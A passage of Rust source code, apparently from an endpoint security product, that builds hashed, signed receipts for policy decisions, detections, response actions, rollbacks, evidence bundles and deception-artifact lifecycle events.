                EndpointReceiptEvidence::hashed("providerKind", provider_kind),
            ],
        }
    }

    #[must_use]
    pub fn for_policy_decision(input: EndpointPolicyDecisionReceiptInput<'_>) -> Self {
        let allowed_text = input.allowed.to_string();
        let guard = input.guard.unwrap_or("none");
        let decision_id = policy_decision_id_from_fields(
            input.actor.endpoint_id.as_str(),
            input.policy.policy_hash.as_str(),
            input.action_type,
            input.target,
            input.allowed,
            guard,
        );
        let mut evidence = vec![
            EndpointReceiptEvidence::hashed("actionType", input.action_type),
            EndpointReceiptEvidence::hashed("target", input.target),
            EndpointReceiptEvidence::hashed("allowed", allowed_text),
            EndpointReceiptEvidence::hashed("guard", guard),
        ];
        if let Some(severity_label) = input.severity_label {
            evidence.push(EndpointReceiptEvidence::hashed("severity", severity_label));
        }
        if let Some(message) = input.message {
            evidence.push(EndpointReceiptEvidence::hashed("message", message));
        }
        if let Some(details) = input.details {
            if let Ok(canonical_details) = canonicalize_json(details) {
                evidence.push(EndpointReceiptEvidence::hashed(
                    "details",
                    canonical_details,
                ));
            }
        }

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::PolicyDecision,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: input.actor,
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(decision_id),
                rule_id: Some(format!("endpoint.policy_decision.{}", input.action_type)),
                title: Some(if input.allowed {
                    "Endpoint policy decision allowed".to_string()
                } else {
                    "Endpoint policy decision blocked".to_string()
                }),
                severity: input.severity,
                confidence: Some(1.0),
                action: if input.allowed {
                    EndpointDecisionAction::Allow
                } else {
                    EndpointDecisionAction::Block
                },
                passed: input.allowed,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference::default(),
            evidence,
        }
    }

    #[must_use]
    pub fn for_graph_slice(input: EndpointGraphSliceReceiptInput<'_>) -> Self {
        let graph_ref = EndpointGraphReference::for_subgraph(input.root_node_id, input.graph);
        let graph_slice_id = graph_ref.graph_slice_id.clone().unwrap_or_else(|| {
            let node_count = input.graph.nodes.len().to_string();
            let edge_count = input.graph.edges.len().to_string();
            stable_id(
                "graph_slice",
                [input.root_node_id, node_count.as_str(), edge_count.as_str()],
            )
        });
        let graph_content_hash = graph_ref.content_hash.clone();
        let mut evidence = vec![
            EndpointReceiptEvidence::hashed("graphSliceId", graph_slice_id.clone()),
            EndpointReceiptEvidence::hashed("rootNodeId", input.root_node_id),
            EndpointReceiptEvidence::hashed("sliceKind", input.slice_kind),
            EndpointReceiptEvidence::hashed("nodeCount", input.graph.nodes.len().to_string()),
            EndpointReceiptEvidence::hashed("edgeCount", input.graph.edges.len().to_string()),
        ];
        if let Some(graph_content_hash) = graph_content_hash {
            evidence.push(EndpointReceiptEvidence::hashed(
                "contentHash",
                graph_content_hash,
            ));
        }

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::GraphSlice,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor::with_endpoint_id(input.endpoint_id),
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(graph_slice_id.clone()),
                rule_id: Some(format!("endpoint.graph_slice.{}", input.slice_kind)),
                title: Some("Endpoint causal graph slice exported".to_string()),
                severity: None,
                confidence: None,
                action: EndpointDecisionAction::Observe,
                passed: true,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: graph_ref,
            evidence,
        }
    }

    #[must_use]
    pub fn for_detection(input: EndpointDetectionReceiptInput<'_>) -> Self {
        let graph_ref = EndpointGraphReference::for_observation(input.observation, input.graph);
        let mut evidence = vec![
            EndpointReceiptEvidence::hashed("detectionFindingId", &input.finding.finding_id),
            EndpointReceiptEvidence::hashed(
                "detectionObservationId",
                &input.finding.observation_id,
            ),
            EndpointReceiptEvidence::hashed("detectionRuleId", &input.finding.rule_id),
            EndpointReceiptEvidence::hashed("detectionTitle", &input.finding.title),
            EndpointReceiptEvidence::hashed(
                "detectionSeverity",
                detection_severity_label(&input.finding.severity),
            ),
            EndpointReceiptEvidence::hashed(
                "detectionConfidence",
                input.finding.confidence.to_string(),
            ),
        ];
        if let Some(graph_slice_id) = graph_ref.graph_slice_id.as_deref() {
            evidence.push(EndpointReceiptEvidence::hashed(
                "detectionGraphSliceId",
                graph_slice_id,
            ));
        }
        if let Some(process_node_id) = graph_ref.process_node_id.as_deref() {
            evidence.push(EndpointReceiptEvidence::hashed(
                "detectionProcessNodeId",
                process_node_id,
            ));
        }
        evidence.extend(
            input
                .finding
                .evidence
                .iter()
                .map(|item| EndpointReceiptEvidence::hashed(&item.key, &item.value)),
        );

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::Detection,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor::from_observation(input.endpoint_id, input.observation),
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: Some(input.finding.observation_id.clone()),
                finding_id: Some(input.finding.finding_id.clone()),
                rule_id: Some(input.finding.rule_id.clone()),
                title: Some(input.finding.title.clone()),
                severity: Some(input.finding.severity.clone()),
                confidence: Some(input.finding.confidence),
                action: EndpointDecisionAction::Alert,
                passed: false,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: graph_ref,
            evidence,
        }
    }

    #[must_use]
    pub fn for_response_request(input: EndpointResponseReceiptInput<'_>) -> Self {
        let graph_ref = EndpointGraphReference::for_subgraph(&input.plan.root_node_id, input.graph);
        let actor = input.actor.with_endpoint_id_if_missing(input.endpoint_id);
        let actor_hash = endpoint_decision_actor_content_hash(&actor);
        let graph_content_hash = graph_ref.content_hash.clone();
        let mut evidence = vec![
            EndpointReceiptEvidence::hashed("responseActionId", &input.plan.action_id),
            EndpointReceiptEvidence::hashed("rootNodeId", &input.plan.root_node_id),
            EndpointReceiptEvidence::hashed("graphSliceId", &input.plan.graph_slice_id),
            EndpointReceiptEvidence::hashed("ttlSeconds", input.plan.ttl_seconds.to_string()),
            EndpointReceiptEvidence::hashed("rollbackRef", &input.plan.rollback_ref),
            EndpointReceiptEvidence::hashed("dryRun", input.plan.dry_run.to_string()),
            EndpointReceiptEvidence::hashed("reason", &input.plan.reason),
            EndpointReceiptEvidence::hashed("actorHash", actor_hash),
        ];
        if let Some(graph_content_hash) = graph_content_hash {
            evidence.push(EndpointReceiptEvidence::hashed(
                "contentHash",
                graph_content_hash,
            ));
        }
        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::ResponseRequest,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor,
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(input.plan.action_id.clone()),
                rule_id: Some(format!("endpoint.response.{}", input.plan.action.as_str())),
                title: Some(if input.plan.dry_run {
                    "Endpoint response action dry run planned".to_string()
                } else {
                    "Endpoint response action planned".to_string()
                }),
                severity: None,
                confidence: Some(1.0),
                action: input.plan.action.clone(),
                passed: true,
                ttl_seconds: Some(input.plan.ttl_seconds),
                rollback_ref: Some(input.plan.rollback_ref.clone()),
            },
            graph: graph_ref,
            evidence,
        }
    }

    #[must_use]
    pub fn for_response_execution(input: EndpointResponseExecutionReceiptInput<'_>) -> Self {
        let graph_ref =
            EndpointGraphReference::for_subgraph(&input.execution.root_node_id, input.graph);
        let actor = input.actor.with_endpoint_id_if_missing(input.endpoint_id);
        let actor_hash = endpoint_decision_actor_content_hash(&actor);
        let execution_actor_hash = input
            .execution
            .actor
            .as_ref()
            .map(endpoint_decision_actor_content_hash)
            .unwrap_or_else(|| actor_hash.clone());
        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::ResponseExecution,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor,
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(input.execution.execution_id.clone()),
                rule_id: Some(format!(
                    "endpoint.response_execution.{}",
                    input.execution.action.as_str()
                )),
                title: Some(
                    match input.execution.status {
                        EndpointResponseExecutionStatus::Succeeded => {
                            "Endpoint response action executed"
                        }
                        EndpointResponseExecutionStatus::Failed => {
                            "Endpoint response action failed"
                        }
                        EndpointResponseExecutionStatus::Partial => {
                            "Endpoint response action partially executed"
                        }
                        EndpointResponseExecutionStatus::Expired => {
                            "Endpoint response action expired"
                        }
                        EndpointResponseExecutionStatus::Cancelled => {
                            "Endpoint response action cancelled"
                        }
                        EndpointResponseExecutionStatus::RolledBack => {
                            "Endpoint response action rolled back"
                        }
                    }
                    .to_string(),
                ),
                severity: None,
                confidence: Some(1.0),
                action: input.execution.action.clone(),
                passed: input.execution.status == EndpointResponseExecutionStatus::Succeeded,
                ttl_seconds: Some(input.execution.ttl_seconds),
                rollback_ref: Some(input.execution.rollback_ref.clone()),
            },
            graph: graph_ref,
            evidence: {
                let mut evidence = vec![
                    EndpointReceiptEvidence::hashed("responseActionId", &input.execution.action_id),
                    EndpointReceiptEvidence::hashed("executionId", &input.execution.execution_id),
                    EndpointReceiptEvidence::hashed("rootNodeId", &input.execution.root_node_id),
                    EndpointReceiptEvidence::hashed(
                        "graphSliceId",
                        &input.execution.graph_slice_id,
                    ),
                    EndpointReceiptEvidence::hashed(
                        "ttlSeconds",
                        input.execution.ttl_seconds.to_string(),
                    ),
                    EndpointReceiptEvidence::hashed("rollbackRef", &input.execution.rollback_ref),
                    EndpointReceiptEvidence::hashed(
                        "executionStatus",
                        input.execution.status.as_str(),
                    ),
                    EndpointReceiptEvidence::hashed("dryRun", input.execution.dry_run.to_string()),
                    EndpointReceiptEvidence::hashed(
                        "evidenceBundleId",
                        &input.execution.evidence_bundle.bundle_id,
                    ),
                    EndpointReceiptEvidence::hashed(
                        "evidenceBundleContentHash",
                        &input.execution.evidence_bundle.content_hash,
                    ),
                    EndpointReceiptEvidence::hashed("reason", &input.execution.reason),
                    EndpointReceiptEvidence::hashed(
                        "effectCount",
                        input.execution.effects.len().to_string(),
                    ),
                    EndpointReceiptEvidence::hashed("actorHash", actor_hash),
                    EndpointReceiptEvidence::hashed("executionActorHash", execution_actor_hash),
                ];
                for effect in &input.execution.effects {
                    evidence.push(EndpointReceiptEvidence::hashed(
                        format!("executionEffect:{}", effect.effect_id),
                        response_effect_evidence_value(effect),
                    ));
                    evidence.push(EndpointReceiptEvidence::hashed(
                        format!("executionEffectType:{}", effect.effect_id),
                        &effect.effect_type,
                    ));
                }
                evidence
            },
        }
    }

    #[must_use]
    pub fn for_response_rollback(input: EndpointResponseRollbackReceiptInput<'_>) -> Self {
        let graph_ref =
            EndpointGraphReference::for_subgraph(&input.rollback.root_node_id, input.graph);
        let actor = input.actor.with_endpoint_id_if_missing(input.endpoint_id);
        let actor_hash = endpoint_decision_actor_content_hash(&actor);
        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::ResponseRollback,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor,
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(input.rollback.rollback_id.clone()),
                rule_id: Some(format!(
                    "endpoint.response_rollback.{}",
                    input.rollback.action.as_str()
                )),
                title: Some("Endpoint response rollback executed".to_string()),
                severity: None,
                confidence: Some(1.0),
                action: input.rollback.action.clone(),
                passed: input.rollback.status == EndpointResponseExecutionStatus::Succeeded,
                ttl_seconds: Some(input.rollback.ttl_seconds),
                rollback_ref: Some(input.rollback.rollback_ref.clone()),
            },
            graph: graph_ref,
            evidence: {
                let mut evidence = vec![
                    EndpointReceiptEvidence::hashed("rollbackId", &input.rollback.rollback_id),
                    EndpointReceiptEvidence::hashed("executionId", &input.rollback.execution_id),
                    EndpointReceiptEvidence::hashed("responseActionId", &input.rollback.action_id),
                    EndpointReceiptEvidence::hashed("rootNodeId", &input.rollback.root_node_id),
                    EndpointReceiptEvidence::hashed("graphSliceId", &input.rollback.graph_slice_id),
                    EndpointReceiptEvidence::hashed(
                        "ttlSeconds",
                        input.rollback.ttl_seconds.to_string(),
                    ),
                    EndpointReceiptEvidence::hashed("rollbackRef", &input.rollback.rollback_ref),
                    EndpointReceiptEvidence::hashed(
                        "rollbackStatus",
                        input.rollback.status.as_str(),
                    ),
                    EndpointReceiptEvidence::hashed("reason", &input.rollback.reason),
                    EndpointReceiptEvidence::hashed(
                        "effectCount",
                        input.rollback.effects.len().to_string(),
                    ),
                    EndpointReceiptEvidence::hashed("actorHash", actor_hash),
                ];
                for effect in &input.rollback.effects {
                    evidence.push(EndpointReceiptEvidence::hashed(
                        format!("rollbackEffect:{}", effect.effect_id),
                        response_effect_evidence_value(effect),
                    ));
                    evidence.push(EndpointReceiptEvidence::hashed(
                        format!("rollbackEffectType:{}", effect.effect_id),
                        &effect.effect_type,
                    ));
                }
                evidence
            },
        }
    }

    #[must_use]
    pub fn for_response_acknowledgement(
        input: EndpointResponseAcknowledgementReceiptInput<'_>,
    ) -> Self {
        let graph_ref =
            EndpointGraphReference::for_subgraph(&input.acknowledgement.root_node_id, input.graph);
        let mut actor = input.actor.with_endpoint_id_if_missing(input.endpoint_id);
        actor.agent_id = Some(input.acknowledgement.acknowledged_by.clone());
        let actor_hash = endpoint_decision_actor_content_hash(&actor);
        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::ResponseAcknowledgement,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor,
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(input.acknowledgement.acknowledgement_id.clone()),
                rule_id: Some(format!(
                    "endpoint.response_acknowledgement.{}",
                    input.acknowledgement.action.as_str()
                )),
                title: Some(format!(
                    "Endpoint response execution acknowledged: {}",
                    input.acknowledgement.status.as_str()
                )),
                severity: None,
                confidence: Some(1.0),
                action: input.acknowledgement.action.clone(),
                passed: true,
                ttl_seconds: Some(input.acknowledgement.ttl_seconds),
                rollback_ref: Some(input.acknowledgement.rollback_ref.clone()),
            },
            graph: graph_ref,
            evidence: {
                let mut evidence = vec![
                    EndpointReceiptEvidence::hashed(
                        "acknowledgementId",
                        &input.acknowledgement.acknowledgement_id,
                    ),
                    EndpointReceiptEvidence::hashed(
                        "executionId",
                        &input.acknowledgement.execution_id,
                    ),
                    EndpointReceiptEvidence::hashed(
                        "responseActionId",
                        &input.acknowledgement.action_id,
                    ),
                    EndpointReceiptEvidence::hashed(
                        "rootNodeId",
                        &input.acknowledgement.root_node_id,
                    ),
                    EndpointReceiptEvidence::hashed(
                        "graphSliceId",
                        &input.acknowledgement.graph_slice_id,
                    ),
                    EndpointReceiptEvidence::hashed(
                        "ttlSeconds",
                        input.acknowledgement.ttl_seconds.to_string(),
                    ),
                    EndpointReceiptEvidence::hashed(
                        "rollbackRef",
                        &input.acknowledgement.rollback_ref,
                    ),
                    EndpointReceiptEvidence::hashed(
                        "acknowledgedStatus",
                        input.acknowledgement.status.as_str(),
                    ),
                    EndpointReceiptEvidence::hashed(
                        "acknowledgedBy",
                        &input.acknowledgement.acknowledged_by,
                    ),
                    EndpointReceiptEvidence::hashed(
                        "effectCount",
                        input.acknowledgement.effects.len().to_string(),
                    ),
                    EndpointReceiptEvidence::hashed("actorHash", actor_hash),
                ];
                if let Some(note) = &input.acknowledgement.note {
                    evidence.push(EndpointReceiptEvidence::hashed("note", note));
                }
                if let Some(control) = &input.acknowledgement.control_correlation {
                    evidence.push(EndpointReceiptEvidence::hashed(
                        "controlResponseActionId",
                        &control.response_action_id,
                    ));
                    if let Some(delivery_id) = &control.delivery_id {
                        evidence.push(EndpointReceiptEvidence::hashed(
                            "controlDeliveryId",
                            delivery_id,
                        ));
                    }
                    evidence.push(EndpointReceiptEvidence::hashed(
                        "controlTargetKind",
                        &control.target_kind,
                    ));
                    evidence.push(EndpointReceiptEvidence::hashed(
                        "controlTargetId",
                        &control.target_id,
                    ));
                    evidence.push(EndpointReceiptEvidence {
                        key: "controlAckTokenHash".to_string(),
                        value_hash: control.ack_token_hash.clone(),
                        redaction_class: EndpointEvidenceRedactionClass::HashOnly,
                        raw_value: None,
                    });
                    evidence.push(EndpointReceiptEvidence::hashed(
                        "controlAckStatus",
                        &control.ack_status,
                    ));
                    if let Some(resulting_state) = &control.resulting_state {
                        evidence.push(EndpointReceiptEvidence::hashed(
                            "controlResultingState",
                            resulting_state,
                        ));
                    }
                }
                for effect in &input.acknowledgement.effects {
                    evidence.push(EndpointReceiptEvidence::hashed(
                        format!("acknowledgementEffect:{}", effect.effect_id),
                        response_effect_evidence_value(effect),
                    ));
                    evidence.push(EndpointReceiptEvidence::hashed(
                        format!("acknowledgementEffectType:{}", effect.effect_id),
                        &effect.effect_type,
                    ));
                }
                evidence
            },
        }
    }

    #[must_use]
    pub fn for_evidence_bundle_manifest(
        input: EndpointEvidenceBundleManifestReceiptInput<'_>,
    ) -> Self {
        let graph_ref = EndpointGraphReference::for_subgraph(input.root_node_id, input.graph);
        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::EvidenceBundleManifest,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor {
                endpoint_id: input.endpoint_id.to_string(),
                ..EndpointDecisionActor::default()
            },
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(input.bundle.bundle_id.clone()),
                rule_id: Some("endpoint.evidence_bundle_manifest".to_string()),
                title: Some("Endpoint evidence bundle manifest".to_string()),
                severity: None,
                confidence: None,
                action: EndpointDecisionAction::CollectEvidence,
                passed: true,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: graph_ref,
            evidence: vec![
                EndpointReceiptEvidence::hashed("evidenceBundleId", &input.bundle.bundle_id),
                EndpointReceiptEvidence::hashed("graphSliceId", &input.bundle.graph_slice_id),
                EndpointReceiptEvidence::hashed("contentHash", &input.bundle.content_hash),
                EndpointReceiptEvidence::hashed("nodeCount", input.bundle.node_count.to_string()),
                EndpointReceiptEvidence::hashed("edgeCount", input.bundle.edge_count.to_string()),
            ],
        }
    }

    #[must_use]
    pub fn for_deception_materialization(
        input: EndpointDeceptionMaterializationReceiptInput<'_>,
    ) -> Self {
        let plan_value = serde_json::to_value(input.plan)
            .ok()
            .and_then(|value| canonicalize_json(&value).ok())
            .unwrap_or_else(|| input.plan.endpoint_id.clone());
        let report_value = serde_json::to_value(input.report)
            .ok()
            .and_then(|value| canonicalize_json(&value).ok())
            .unwrap_or_default();
        let plan_root = input.plan.root.display().to_string();
        let plan_hash = sha256(plan_value.as_bytes()).to_hex_prefixed();
        let report_hash = sha256(report_value.as_bytes()).to_hex_prefixed();
        let artifact_count = input.plan.artifacts.len().to_string();
        let created_count = input.report.created.len().to_string();
        let skipped_count = input.report.skipped.len().to_string();
        let registered_artifact_count = input.registered_artifact_count.to_string();
        let mut artifact_ids = input
            .plan
            .artifacts
            .iter()
            .map(|artifact| artifact.artifact_id.as_str())
            .collect::<Vec<_>>();
        artifact_ids.sort_unstable();
        let artifact_ids = artifact_ids.join(",");
        let materialization_id = deception_materialization_id_from_hashes(
            input.endpoint_id,
            input.policy.policy_hash.as_str(),
            DeceptionMaterializationIdValues {
                plan_root: plan_root.as_str(),
                plan_hash: plan_hash.as_str(),
                report_hash: report_hash.as_str(),
                artifact_count: artifact_count.as_str(),
                created_count: created_count.as_str(),
                skipped_count: skipped_count.as_str(),
                registered_artifact_count: registered_artifact_count.as_str(),
                artifact_ids: artifact_ids.as_str(),
            },
        );

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::DeceptionMaterialization,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor {
                endpoint_id: input.endpoint_id.to_string(),
                ..EndpointDecisionActor::default()
            },
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(materialization_id),
                rule_id: Some("endpoint.deception.materialization".to_string()),
                title: Some("Endpoint deception materialized".to_string()),
                severity: None,
                confidence: Some(1.0),
                action: EndpointDecisionAction::Observe,
                passed: true,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference::default(),
            evidence: vec![
                EndpointReceiptEvidence::hashed("endpointId", input.endpoint_id),
                EndpointReceiptEvidence::hashed("deceptionPlanRoot", plan_root),
                EndpointReceiptEvidence::hashed("deceptionPlanHash", &plan_hash),
                EndpointReceiptEvidence::hashed("materializationReportHash", &report_hash),
                EndpointReceiptEvidence::hashed("artifactCount", artifact_count),
                EndpointReceiptEvidence::hashed("createdCount", created_count),
                EndpointReceiptEvidence::hashed("skippedCount", skipped_count),
                EndpointReceiptEvidence::hashed(
                    "registeredArtifactCount",
                    registered_artifact_count,
                ),
                EndpointReceiptEvidence::hashed("artifactIds", artifact_ids),
            ],
        }
    }

    #[must_use]
    pub fn for_deception_cleanup(input: EndpointDeceptionCleanupReceiptInput<'_>) -> Self {
        let plan_value = serde_json::to_value(input.plan)
            .ok()
            .and_then(|value| canonicalize_json(&value).ok())
            .unwrap_or_else(|| input.plan.endpoint_id.clone());
        let report_value = serde_json::to_value(input.report)
            .ok()
            .and_then(|value| canonicalize_json(&value).ok())
            .unwrap_or_default();
        let plan_root = input.plan.root.display().to_string();
        let plan_hash = sha256(plan_value.as_bytes()).to_hex_prefixed();
        let report_hash = sha256(report_value.as_bytes()).to_hex_prefixed();
        let artifact_count = input.plan.artifacts.len().to_string();
        let dry_run = input.report.dry_run.to_string();
        let removed_count = input.report.removed.len().to_string();
        let would_remove_count = input.report.would_remove.len().to_string();
        let missing_count = input.report.missing.len().to_string();
        let refused_count = input.report.refused.len().to_string();
        let deregistered_artifact_count = input.deregistered_artifact_count.to_string();
        let remaining_registered_artifact_count =
            input.remaining_registered_artifact_count.to_string();
        let cleanup_id = deception_cleanup_id_from_hashes(
            input.endpoint_id,
            input.policy.policy_hash.as_str(),
            DeceptionCleanupIdValues {
                plan_root: plan_root.as_str(),
                plan_hash: plan_hash.as_str(),
                report_hash: report_hash.as_str(),
                artifact_count: artifact_count.as_str(),
                dry_run: dry_run.as_str(),
                removed_count: removed_count.as_str(),
                would_remove_count: would_remove_count.as_str(),
                missing_count: missing_count.as_str(),
                refused_count: refused_count.as_str(),
                deregistered_artifact_count: deregistered_artifact_count.as_str(),
                remaining_registered_artifact_count: remaining_registered_artifact_count.as_str(),
            },
        );

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::DeceptionCleanup,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor {
                endpoint_id: input.endpoint_id.to_string(),
                ..EndpointDecisionActor::default()
            },
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(cleanup_id),
                rule_id: Some("endpoint.deception.cleanup".to_string()),
                title: Some(if input.report.dry_run {
                    "Endpoint deception cleanup dry run planned".to_string()
                } else {
                    "Endpoint deception cleanup executed".to_string()
                }),
                severity: None,
                confidence: Some(1.0),
                action: EndpointDecisionAction::Observe,
                passed: refused_count == "0",
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference::default(),
            evidence: vec![
                EndpointReceiptEvidence::hashed("endpointId", input.endpoint_id),
                EndpointReceiptEvidence::hashed("deceptionPlanRoot", plan_root),
                EndpointReceiptEvidence::hashed("deceptionPlanHash", &plan_hash),
                EndpointReceiptEvidence::hashed("cleanupReportHash", &report_hash),
                EndpointReceiptEvidence::hashed("artifactCount", artifact_count),
                EndpointReceiptEvidence::hashed("dryRun", dry_run),
                EndpointReceiptEvidence::hashed("removedCount", removed_count),
                EndpointReceiptEvidence::hashed("wouldRemoveCount", would_remove_count),
                EndpointReceiptEvidence::hashed("missingCount", missing_count),
                EndpointReceiptEvidence::hashed("refusedCount", refused_count),
                EndpointReceiptEvidence::hashed(
                    "deregisteredArtifactCount",
                    deregistered_artifact_count,
                ),
                EndpointReceiptEvidence::hashed(
                    "remainingRegisteredArtifactCount",
                    remaining_registered_artifact_count,
                ),
            ],
        }
    }

    #[must_use]
    pub fn for_deception_rotation(input: EndpointDeceptionRotationReceiptInput<'_>) -> Self {
        let old_plan_value = serde_json::to_value(input.old_plan)
            .ok()
            .and_then(|value| canonicalize_json(&value).ok())
            .unwrap_or_else(|| input.old_plan.endpoint_id.clone());
        let new_plan_value = serde_json::to_value(input.new_plan)
            .ok()
            .and_then(|value| canonicalize_json(&value).ok())
            .unwrap_or_else(|| input.new_plan.endpoint_id.clone());
        let report_value = serde_json::to_value(input.report)
            .ok()
            .and_then(|value| canonicalize_json(&value).ok())
            .unwrap_or_default();
        let old_plan_root = input.old_plan.root.display().to_string();
        let new_plan_root = input.new_plan.root.display().to_string();
        let old_plan_hash = sha256(old_plan_value.as_bytes()).to_hex_prefixed();
        let new_plan_hash = sha256(new_plan_value.as_bytes()).to_hex_prefixed();
        let report_hash = sha256(report_value.as_bytes()).to_hex_prefixed();
        let dry_run = input.report.dry_run.to_string();
        let cleanup_removed_count = input.report.cleanup.removed.len().to_string();
        let cleanup_would_remove_count = input.report.cleanup.would_remove.len().to_string();
        let cleanup_missing_count = input.report.cleanup.missing.len().to_string();
        let cleanup_refused_count = input.report.cleanup.refused.len().to_string();
        let materialization_created_count = input
            .report
            .materialization
            .as_ref()
            .map_or(0, |report| report.created.len())
            .to_string();
        let materialization_skipped_count = input
            .report
            .materialization
            .as_ref()
            .map_or(0, |report| report.skipped.len())
            .to_string();
        let deregistered_artifact_count = input.report.deregistered_artifact_count.to_string();
        let registered_artifact_count = input.report.registered_artifact_count.to_string();
        let remaining_registered_artifact_count =
            input.report.remaining_registered_artifact_count.to_string();
        let rotation_id = deception_rotation_id_from_hashes(
            input.endpoint_id,
            input.policy.policy_hash.as_str(),
            DeceptionRotationIdValues {
                old_plan_root: old_plan_root.as_str(),
                new_plan_root: new_plan_root.as_str(),
                old_plan_hash: old_plan_hash.as_str(),
                new_plan_hash: new_plan_hash.as_str(),
                report_hash: report_hash.as_str(),
                dry_run: dry_run.as_str(),
                cleanup_removed_count: cleanup_removed_count.as_str(),
                cleanup_would_remove_count: cleanup_would_remove_count.as_str(),
                cleanup_missing_count: cleanup_missing_count.as_str(),
                cleanup_refused_count: cleanup_refused_count.as_str(),
                materialization_created_count: materialization_created_count.as_str(),
                materialization_skipped_count: materialization_skipped_count.as_str(),
                deregistered_artifact_count: deregistered_artifact_count.as_str(),
                registered_artifact_count: registered_artifact_count.as_str(),
                remaining_registered_artifact_count: remaining_registered_artifact_count.as_str(),
            },
        );

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::DeceptionRotation,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor {
                endpoint_id: input.endpoint_id.to_string(),
                ..EndpointDecisionActor::default()
            },
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(rotation_id),
                rule_id: Some("endpoint.deception.rotation".to_string()),
                title: Some(if input.report.dry_run {
                    "Endpoint deception rotation dry run planned".to_string()
                } else {
                    "Endpoint deception rotation executed".to_string()
                }),
                severity: None,
                confidence: Some(1.0),
                action: EndpointDecisionAction::Observe,
                passed: cleanup_refused_count == "0",
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference::default(),
            evidence: vec![
                EndpointReceiptEvidence::hashed("endpointId", input.endpoint_id),
                EndpointReceiptEvidence::hashed("oldDeceptionPlanRoot", old_plan_root),
